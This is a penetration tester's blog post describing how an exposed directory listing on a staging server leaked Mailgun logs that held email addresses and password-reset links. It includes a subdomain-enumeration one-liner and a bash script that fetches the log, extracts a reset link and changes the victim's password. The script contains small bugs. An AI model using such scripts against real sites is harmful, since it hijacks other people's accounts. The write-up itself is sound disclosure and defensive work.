---
title: "Directory Listing to Account Takeover"
date: 2017-12-30T01:19:34-08:00
draft: false
---

Directory listing is one of the most common misconfigurations which can be exploited trivially. However, the impact depends on the [criticality of](https://www.itnews.com.au/news/australias-biggest-data-breach-sees-13m-records-leaked-440305) [the files](https://www.troyhunt.com/the-capgemini-leak-of-michael-page-data-via-publicly-facing-database-backup/) present inside the directory.

Recently, during one of my pentests, I came across an interesting open directory which I was able to leverage. On enumerating, I discovered a subdomain which was the staging server and was accessible over the internet.

```bash
[nishaanthguna:~/essentials]$ curl --silent https://crt.sh/\?q\=%.domain.com | sed 's/<\/\?[^>]\+>//g' | grep -i domain.com | tail -n +9 | cut -d ">" -f2 | cut -d "<" -f1
www.domain.com
blog.domain.com
stag.domain.com
```

On running a port scan, it was found that the port 8080 was open and had a directory listing. There wasn't anything sensitive until I found this.

![mailgun](/images/mailgun.png)

From Mailgun's API [documentation](https://documentation.mailgun.com/en/latest/user_manual.html), it looks like the admininstator can track the  [bounces](https://documentation.mailgun.com/en/latest/user_manual.html#tracking-bounces), [clicks](https://documentation.mailgun.com/en/latest/user_manual.html#tracking-opens), [spam compliants](https://documentation.mailgun.com/en/latest/user_manual.html#tracking-spam-complaints), if the mail got [delivered](https://documentation.mailgun.com/en/latest/user_manual.html#tracking-deliveries) or if the user
[unsubscribed](https://documentation.mailgun.com/en/latest/user_manual.html#tracking-unsubscribes) along with the URLs. So, what is the problem here?

Not only the logs leaked personal and developer e-mail addresses, it also did have the reset password links. Something like this,

![reset](/images/reset-link.png)

An attack scenario would be something similar to,

1. An attacker uses the e-mail address obtained from the logs and resets the password using 'Forgot Password' functionality.
2. The victim clicks on the link sent to their e-mail address.
3. The Attacker gets hold of the password reset token because of the directory listing and resets the password.


I wrote a quick script to curl the mailgun-webhook.log file, search for reset links and automatically reset the password.

```bash
#!/bin/bash

curl https://domain.com/mailgun-webhook.log | tee direct.txt
if grep -Fxq "reset" direct.txt
then
 echo "[+]Found a Password Reset link"
 link=$(cat direct.txt | grep -i reset | cut -d "," -f6  |
 cut -d "\\" -f1 | head -n 1)
 curl '$link'-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6)'
 --data 'password=testpassword%21%21&confirmation=testpassword%21%21' --compressed
 echo "[+]Password changed to testpassword!!"
else
 echo "[-]Reset link not found"
fi
```

It is always recommended to [disable](https://stackoverflow.com/questions/2530372/how-do-i-disable-directory-browsing) directory listing and never store sensitive information like credentials, password reset links, API keys in cleartext.

Update - Some people are confusing this vulnerability with the recent [Reddit Email](https://gizmodo.com/reddit-email-vulnerability-leads-to-thousands-of-dollar-1821808073) [Vulnerability](http://blog.mailgun.com/mailgun-security-incident-and-important-customer-information/) which was used to steal Bitcoin Cash. Both of the vulnerabilities are completely unrelated except for the fact that accounts were compromised in a similar fashion. 
